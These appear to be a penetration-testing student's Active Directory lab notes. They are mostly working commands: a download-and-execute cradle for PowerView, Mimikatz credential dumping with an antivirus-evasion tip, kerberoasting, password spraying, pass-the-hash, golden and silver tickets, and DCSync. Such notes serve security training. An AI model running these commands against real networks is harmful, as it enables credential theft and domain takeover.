Simple Enumeration Approach
               - enumerate all local accounts 
                    - net user
               - enumerate all users in the entire domain
                    - net user /domain
               - query a specific user
                    - net user jeff_admin /domain
               - enumerate all groups in the domain
                    - net group /domain
               - Enumerate domain account policy (important for slow password attacks)
                    - net accounts
                    
Currently Logged on Users
          - Import-Module .\PowerView.ps1
          - PS C:\Tools\active_directory> Get-NetLoggedon -ComputerName client251
          - PS C:\Tools\active_directory> Get-NetSession -ComputerName dc01
          - Alt method: Execute from memory
            - Serve PowerView.psq on your machine 
            - iex (New-Object System.Net.Webclient).DownloadString('http://<IP>/PowerView.ps1')
            - Get-NetSession -ComputerName dc01
            

             
Enumeration using Scripts (needed for Nested Groups):
  - Use Scripts to find Groups, nested groups and their members.
  - For getting SPNs, if your script is not working, Refer to your lab report or get scripts from the internet. 
  
------------------------------------------------------------------------------------------------


   $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

   $PDC = ($domainObj.PdcRoleOwner).Name

   $SearchString = "LDAP://"

   $SearchString += $PDC + "/"

   $DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"

   $SearchString += $DistinguishedName

   $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)

   $objDomain = New-Object System.DirectoryServices.DirectoryEntry

   $Searcher.SearchRoot = $objDomain

   $Searcher.filter="(objectClass=Group)"
    <# - You can edit the above line to list memebers of a specific group:
          - $Searcher.filter="memberof=CN=<group name>,CN=Users,DC=corp,DC=com"
          - Example: $Searcher.filter="objectcategory=CN=Computer,CN=Schema,CN=Configuration,DC=corp,DC=com"
          - Another example: $Searcher.filter="operatingsystem=Windows 10 Pro"
          - Another example: $Searcher.filter="(name=Nested_Group)"
          - Find a specific IIS SPN:  $Searcher.filter = "serviceprincipalname=*http*"
          - Find all SPN:  $Searcher.filter = "samaccountname=*service*"
          - for IP address of any servers where a service principal name is registered go to page 157 in your lab report.
       
    #>
   $Result = $Searcher.FindAll()
       
   Foreach($obj in $Result)
   {
       Foreach($prop in $obj.Properties)
       {
           $prop
       }

       Write-Host "------------------------"
   }
   
------------------------------------------------------------------------------------------------

Cached Credential Storage and Retrieval 

  Note: Mimikatz might get blocked by AV. Try using an injector like powershell or dump the entire LSASS process memory, move the data
  to a helper machine, and then load the data into Mimikatz.
  
  Use Mimikatz to dump all password hashes:
  - mimikatz.exe
  - privilege::debug
  - sekurlsa::logonpasswords
  
 Service Account Attacks
 
 We know an SPN: HTTP/CorpWebServer.corp.com
 - Add-Type -AssemblyName System.IdentityModel
 - New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
      - After execution, the requested service ticket should be generated by the domain controller and loaded into the memory of the Windows 10 client. 
 - Instead of executing Mimikatz all the time, we can also use the built-in klist command to display all cached Kerberos tickets for the current user
      - PS C:\Users\offsec.CORP> klist
 - Export ticket: mimikatz # kerberos::list /export
 - Perform wordlist attack on your kali machine:
   - kerberoast
     - sudo apt update && sudo apt install kerberoast
     - python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offsec@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
   - John 
     - Convert the kirbi file: sudo python3 kirbi2john.py.1 1-40a10000-offsec@MSSQLSvc~CorpSqlServer.corp.com~1433-CORP.COM.kirbi > hash.txt
     - john --wordlist=wordlist.txt hash.txt
   - Invoke-Kerberoast.ps1 
     - import-module .\Invoke-Kerberoast.ps1
     - Invoke-Kerberoast | % { $_.Hash } | % { $_.replace('krb5tgs$', 'krb5tgs$23$*') } | % { $_ -replace "(.*):(.*)", '$1*$$$2' } | % {$_.replace(':','~') } | Out-file - FilePath .\hashes.txt -Encoding utf8
     - Take hashes.txt to your machine.
     - john --wordlist=wordlist.txt hashes.txt
     
 Password Guessing:
  
  - Download this: https://raw.githubusercontent.com/tobor88/PayloadSiteForPenTesters/master/Spray-Passwords.ps1
  - .\Spray-Password.ps1 -File .\password.txt -Admins -Verbose
  
Pass the Hash: 

- kali@kali:~$ pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
  - The above is done with an NTLM hash
- Alternative: psexec.py "Administrator":@192.168.11.132 -hashes :920ae267e048417fcfe00f49ecbd4b33
  
Overpass the Hash: Example is using an NTLM hash

- Use Mimikatz to dump all password hashes:
  - Running notepad as jeff_admin by shift + right click and choosing Run as different user 
  - mimikatz.exe
  - privilege::debug
  - sekurlsa::logonpasswords
      - Get an NTLM hash
  - sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:2892d26cdf84d7a70e2eb3b9f05c425e /run:PowerShell.exe
  - Generate a kerb ticket by authenticating to the network share on the DC: net use \\dc01
  - Run klist to list the newly requested Kerberos tickets, these include a TGT and a TGS for the CIFS service
  - klist
  - .\PsExec.exe \\dc01 cmd.exe
  
Pass the Ticket:
 
  - obtain the SID of our current user with the whoami /user command: whoami /user
  - mimikatz.exe
  - privilege::debug
  - kerberos::purge
  - kerberos::list 
     - should have no results 
  - kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
      - /rc4: password hash of the iis_service service account 
      - the fully qualified host name of the service (/target)
      - silver ticket is injected directly into memory with the /ptt flag.
      - Then when you perform kerberos auth when you access anything remotely, this will be used.

Distributed Component Object Model 
  - Refer to 21.4.7 (page 176)
  
Active Directory Persistence
     
     - Golden Ticket
          - After compromising the DC, start mimikatz: 
               - privilege::debug
               - lsadump::lsa /patch
                    - Get the Krbtgt hash
          - Generate a golden ticket from the compormised local machine rather than the DC
               - kerberos::purge
               - kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
                    - Get the Domain SID: whoami /user
                    - Hash: /krbtgt:75b60230a2394a812000dbfad8415965
                    - Set the golden ticket's username to fakeuser
               - misc::cmd 
               - In the resulting window: Now test persisitence from the windows VM: psexec.exe \\dc01 cmd.exe
                    - whoami
                    - whoami /groups
               - Note:  we were to connect using PsExec to the IP address of the domain controller instead of the hostname, we would instead force the use of NTLM authentication and access would still be blocked 
                    - psexec.exe \\192.168.1.110 cmd.exe
                         - this would fail
                         - always use hostname with this attack.
           Alternative: After compromising the DC
          - Domain Controller Sync
          - You need to compromise a local admin account
          - log in to the Windows 10 client as jeff_admin 
          - Start mimikatz
               - lsadump::dcsync /user:Administrator
               - you can change the user name
               
 --------------------------------------------------------------------------------------------------------------------------------------------------
 
Foothold: 

- Nmap: nmap -sC -sV -T4 <IP> > int.txt
  - Sometimes you will find ldap default password
    - You can use the password to enumerate ldap and get usernames: ldapsearch -h <IP> -bx "DC=<>,DC=<>"
    
- Password Spray 
  - If you have usernames and passwords you may try and bruteforce:
    - cme smb <IP> -u user.txt -p 'passowrd'
    - cme ssh <IP> -u user.txt -p 'passowrd'
    - Note: try on all three machines and try to hit all services that take login creds. 
    - Very likely you get a valid cred set and you can use it to ssh or rdp into the first machine

- Privelge Escalation: 
  - Use winpeas to locate insecure service executables, then use msfvenom to generate a payload to replace the exe file: 
    - You can check manually: 
      - accesschk.exe -uwcqv *
      - accesschk.exe -uwcqv "Your group name" *
      - A common example is printing services.
    - https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
    - shutdown /r /t 0 
    
  - Look for hardcoded password
    - You can use found creds to enum smb shares: cme smb <IP> -u 'user' -p 'passowrd'
    - You can login using psexec: PSExec.exe <domain>/<user>:<password>@<IP>
    - You can use evil-winrm to get to domain controllers: evil-winrm -i <IP> -u <user> -p <password>
    
- Post compromise of the first machine: 
  - Get mimikatz on the first machine
    - One liner: mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > passwords.txt
    - Broken down:
      - mimikatz.exe
      - privilege::debug
      - sekurlsa::logonpasswords
      - exit
  - Crack NTLM passwords
    - hashcat hash.txt rockyou.txt
    - hashcat --show 

- Pivot from first machine to 2nd 
  - xfreerdp /u:<username> /p:<password> /v:<IP>
    
      
   
  
  
  

